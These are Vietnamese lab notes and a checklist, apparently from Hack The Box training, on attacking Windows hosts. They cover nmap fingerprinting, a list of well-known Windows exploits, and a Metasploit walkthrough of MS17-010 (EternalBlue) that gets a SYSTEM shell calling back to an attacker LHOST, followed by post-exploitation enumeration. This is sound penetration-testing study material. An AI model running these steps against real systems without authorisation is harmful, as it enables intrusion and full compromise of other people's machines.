# Infiltrating Windows

## Mục tiêu

Chuỗi xâm nhập Windows cơ bản:

```text
Fingerprint OS
→ Enumerate services
→ Xác định attack surface
→ Kiểm tra vulnerability
→ Chọn exploit và payload
→ Nhận shell
→ Xác định quyền và loại shell
→ Post-exploitation
```

## Nhận diện Windows host

### TTL

Windows thường có initial TTL gần `128`.

```bash
ping <TARGET_IP>
```

Ví dụ:

```text
ttl=128
ttl=127
ttl=126
```

TTL chỉ là dấu hiệu tham khảo, không phải bằng chứng tuyệt đối.

### Nmap OS detection

```bash
sudo nmap -v -O <TARGET_IP>
```

Các trường cần chú ý:

```text
Running
OS CPE
OS details
Network Distance
```

Nếu host discovery bị chặn:

```bash
sudo nmap -Pn -O <TARGET_IP>
```

Aggressive scan:

```bash
sudo nmap -v -A <TARGET_IP>
```

`-A` bật OS detection, version detection, default scripts và traceroute.

### Windows port thường gặp

```text
135/tcp   MSRPC
139/tcp   NetBIOS
445/tcp   SMB
3389/tcp  RDP
5985/tcp  WinRM HTTP
5986/tcp  WinRM HTTPS
```

### Banner grabbing

```bash
sudo nmap -v <TARGET_IP> --script banner
```

Banner có thể tiết lộ:

- Tên phần mềm
    
- Phiên bản
    
- Protocol
    
- Product
    
- Service implementation
    

Không nên tin hoàn toàn banner vì nó có thể bị sửa hoặc che giấu.

---

## Các Windows exploit nổi bật

| Exploit/Vulnerability       | Thành phần                 |
| --------------------------- | -------------------------- |
| MS08-067                    | Windows Server Service/RPC |
| EternalBlue – MS17-010      | SMBv1                      |
| PrintNightmare              | Print Spooler              |
| BlueKeep – CVE-2019-0708    | RDP                        |
| SIGRed – CVE-2020-1350      | Windows DNS Server         |
| SeriousSAM – CVE-2021-36934 | SAM và Volume Shadow Copy  |
| Zerologon – CVE-2020-1472   | Netlogon/MS-NRPC           |

---

## Payload type trên Windows

### DLL

Dùng trong:

- DLL hijacking
    
- DLL side-loading
    
- DLL injection
    
- Privilege escalation
    

### BAT

Batch script chạy nhiều lệnh CMD:

```bat
whoami
hostname
ipconfig /all
net user
```

### VBS

Thực thi qua Windows Script Host:

```cmd
cscript script.vbs
wscript script.vbs
```

### MSI

Package của Windows Installer:

```cmd
msiexec /i package.msi
```

MSI chỉ chạy với quyền của context hiện tại, trừ khi có privilege hoặc misconfiguration khác.

### PowerShell

Shell và scripting language dựa trên .NET:

```powershell
Get-Process
Get-Service
Get-ChildItem
Get-NetIPAddress
```

---

## Công cụ quan trọng

- Metasploit Framework: scan, exploit, payload, post-exploitation
    
- MSFvenom: tạo payload
    
- Impacket: SMB, RPC, WMI, Kerberos và remote execution
    
- PayloadsAllTheThings: methodology và payload reference
    
- Nishang: offensive PowerShell scripts
    
- Mythic: C2 framework
    

---

## Workflow khai thác MS17-010

### 1. Enumerate

```bash
nmap -v -A <TARGET_IP>
```

Tìm:

- Port `445/tcp`
    
- Windows version
    
- SMB version
    
- Hostname
    
- Domain/workgroup
    
- SMB signing
    

### 2. Kiểm tra MS17-010

```text
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS <TARGET_IP>
run
```

Kết quả mong đợi:

```text
Host is likely VULNERABLE to MS17-010
```

Không nên khai thác chỉ dựa vào suy đoán phiên bản OS.

### 3. Chọn exploit

```text
search ms17_010
use exploit/windows/smb/ms17_010_psexec
```

### 4. Cấu hình

```text
set RHOSTS <TARGET_IP>
set LHOST <TUN0_IP>
set LPORT 4444
show options
```

### 5. Chạy exploit

```text
run
```

hoặc:

```text
exploit
```

### 6. Kiểm tra quyền

```text
getuid
```

Ví dụ:

```text
Server username: NT AUTHORITY\SYSTEM
```

### 7. Mở native shell

```text
shell
```

Phân biệt:

```text
C:\Windows\system32>      → CMD
PS C:\Windows\system32>   → PowerShell
```

---

## CMD và PowerShell

### Dùng CMD khi

- Chỉ cần native command đơn giản
    
- Chạy batch file
    
- Host cũ hoặc PowerShell không khả dụng
    
- PowerShell bị hạn chế
    
- Cần tương tác nhanh với `net`, `sc`, `tasklist`, `systeminfo`
    

### Dùng PowerShell khi

- Cần cmdlet
    
- Cần làm việc với .NET object
    
- Cần script phức tạp
    
- Cần quản trị Windows, AD hoặc cloud
    
- Cần lọc, biến đổi và tự động hóa dữ liệu
    

CMD chủ yếu xử lý text. PowerShell truyền object qua pipeline.

---

## Ghi nhớ

- TTL gần 128 chỉ là một dấu hiệu của Windows.
    
- Port 445 mở không đồng nghĩa target có EternalBlue.
    
- Phải dùng scanner/check module trước exploit.
    
- `RHOSTS` là target; `LHOST` là địa chỉ attacker mà target kết nối về.
    
- `LHOST` trong HTB thường là IP interface `tun0`.
    
- Meterpreter không phải CMD hay PowerShell.
    
- Lệnh `shell` từ Meterpreter mới mở native Windows shell.
    
- `NT AUTHORITY\SYSTEM` là quyền local rất cao.
    
- Enumeration và vulnerability validation quan trọng hơn việc chọn exploit theo cảm tính.

---
# Windows Infiltration Lab Checklist

## 1. Xác định target và kết nối

-  Xác nhận target IP.
    
-  Kiểm tra VPN HTB đang hoạt động.
    
-  Kiểm tra IP của interface VPN:
    

```bash
ip addr show tun0
```

-  Ghi lại IP `tun0` để dùng làm `LHOST`.
    

---

## 2. Host discovery và fingerprinting

-  Ping target:
    

```bash
ping -c 4 <TARGET_IP>
```

-  Ghi lại TTL.
    
-  Không kết luận host chết chỉ vì ping không phản hồi.
    
-  Chạy full TCP port scan:
    

```bash
sudo nmap -Pn -p- --min-rate 1000 -oA scans/all-tcp <TARGET_IP>
```

-  Scan service/version trên các port mở:
    

```bash
sudo nmap -Pn -sC -sV -O -p<PORTS> -oA scans/services <TARGET_IP>
```

-  Ghi lại:
    
    -  OS dự đoán
        
    -  Hostname
        
    -  Workgroup/domain
        
    -  Service
        
    -  Version
        
    -  SMB signing
        
    -  SMB dialect/version
        

---

## 3. Nếu có SMB port 445

-  Chạy SMB enumeration:
    

```bash
sudo nmap -Pn -p445 --script "smb-os-discovery,smb-protocols,smb-security-mode,smb2-security-mode,smb-enum-shares" <TARGET_IP>
```

-  Kiểm tra share:
    

```bash
smbclient -N -L //<TARGET_IP>
```

-  Kiểm tra MS17-010:
    

```bash
sudo nmap -Pn -p445 --script smb-vuln-ms17-010 <TARGET_IP>
```

-  Có thể xác minh thêm bằng Metasploit:
    

```text
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS <TARGET_IP>
run
```

-  Chỉ chuyển sang exploit khi scanner cho thấy target có khả năng dễ bị tấn công.
    

---

## 4. Cấu hình Metasploit

-  Mở Metasploit:
    

```bash
msfconsole
```

-  Tìm module:
    

```text
search ms17_010
```

-  Chọn exploit phù hợp:
    

```text
use exploit/windows/smb/ms17_010_psexec
```

-  Xem thông tin module:
    

```text
info
```

-  Xem option:
    

```text
show options
```

-  Đặt target:
    

```text
set RHOSTS <TARGET_IP>
```

-  Đặt attacker callback address:
    

```text
set LHOST <TUN0_IP>
```

-  Đặt listener port:
    

```text
set LPORT 4444
```

-  Kiểm tra payload:
    

```text
show payloads
show options
```

-  Kiểm tra vulnerability nếu module hỗ trợ:
    

```text
check
```

---

## 5. Thực thi và nhận session

-  Chạy exploit:
    

```text
run
```

-  Kiểm tra có session hay không:
    

```text
sessions
```

-  Tương tác với session:
    

```text
sessions -i 1
```

-  Xác định user:
    

```text
getuid
```

-  Xác định thông tin hệ thống:
    

```text
sysinfo
```

-  Mở native shell:
    

```text
shell
```

---

## 6. Xác định loại shell

-  Prompt dạng sau là CMD:
    

```text
C:\Windows\system32>
```

-  Prompt dạng sau là PowerShell:
    

```text
PS C:\Windows\system32>
```

-  Trong CMD, kiểm tra:
    

```cmd
echo %COMSPEC%
```

-  Trong PowerShell, kiểm tra:
    

```powershell
$PSVersionTable
```

-  Không dùng lệnh `host` để lấy hostname trong PowerShell vì `host` là alias của `Get-Host`.
    
-  Lấy hostname bằng:
    

```cmd
hostname
```

hoặc:

```powershell
$env:COMPUTERNAME
```

---

## 7. Enumeration sau khi có shell

-  User hiện tại:
    

```cmd
whoami
```

-  Hostname:
    

```cmd
hostname
```

-  OS/version:
    

```cmd
systeminfo
```

-  Network:
    

```cmd
ipconfig /all
route print
arp -a
```

-  User:
    

```cmd
net user
```

-  Local administrators:
    

```cmd
net localgroup administrators
```

-  Process:
    

```cmd
tasklist
```

-  Service:
    

```cmd
sc query
```

-  Kiểm tra quyền:
    

```cmd
whoami /priv
whoami /groups
```

---

## 8. Khi exploit thất bại

-  Kiểm tra `RHOSTS` đúng chưa.
    
-  Kiểm tra `LHOST` có phải IP `tun0` không.
    
-  Kiểm tra port 445 còn mở không.
    
-  Kiểm tra target đã reset/rebuild chưa.
    
-  Kiểm tra payload architecture x86/x64.
    
-  Kiểm tra SMBv1.
    
-  Thử `check`.
    
-  Đọc `info` và target compatibility.
    
-  Thử module khác phù hợp hơn.
    
-  Không chạy exploit lặp lại liên tục nếu exploit có thể làm crash target.